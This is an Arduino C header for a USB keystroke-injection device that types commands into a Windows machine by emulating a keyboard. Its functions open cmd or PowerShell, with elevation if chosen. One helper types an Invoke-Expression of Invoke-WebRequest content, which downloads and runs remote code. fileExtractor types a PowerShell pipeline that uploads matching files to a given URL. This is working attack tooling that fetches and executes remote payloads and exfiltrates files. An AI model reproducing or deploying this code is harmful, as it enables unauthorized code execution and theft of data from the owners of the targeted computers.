#ifndef C_INSTRUCTIONS_H
#define C_INSTRUCTIONS_H

#include <Keyboard.h>

// Define SLOW_TYPING in your project's main.ino to enable slow typing
#ifdef SLOW_TYPING
void typeCommand(const String& text) {
    for (unsigned int i = 0; i < text.length(); i++) {
        Keyboard.write(text.charAt(i));
        delay(TYPING_DELAY);
    }
    Keyboard.write(KEY_RETURN);
    delay(100);
}
#else
void typeCommand(const String& text) {
    Keyboard.println(text);
}
#endif

// Notepad
void openNotepad() {
    run();
    typeCommand("notepad");
    delay(1000);
}

// PowerShell
void openPowerShell() {
    run();
    typeCommand("powershell");
    delay(1000);
}

void openPowerShellAdmin() {
    run();
    typeCommand("powershell");
    admin();
    delay(1000);
}

void execPowerShellScript(String link) {
    openPowerShell();
    String powerShellCommand = "Invoke-Expression (Invoke-WebRequest -Uri \"" + link + "\").Content";
    typeCommand(powerShellCommand);
}

void execPowerShellScriptAdmin(String link) {
    openPowerShellAdmin();
    String powerShellCommand = "Invoke-Expression (Invoke-WebRequest -Uri \"" + link + "\").Content";
    typeCommand(powerShellCommand);
}

// CMD
void openCmd() {
    run();
    typeCommand("cmd");
    delay(1000);
}

void openCmdAdmin() {
    run();
    typeCommand("cmd");
    admin();
    delay(1000);
}

void execCmd(String command) {
    openCmd();
    typeCommand(command);
}

void execCmdAdmin(String command) {
    openCmdAdmin();
    typeCommand(command);
}

// File
void fileExtractor(String path, String file, String link) {
    openPowerShell();
    String powerShellCommand = "Get-ChildItem -Path \"" + path + "\" -Filter \"" + file + "\" | ForEach-Object { Invoke-WebRequest -Uri \"" + link + "\" -Method Post -InFile $_.FullName }";
    typeCommand(powerShellCommand);
}

#endif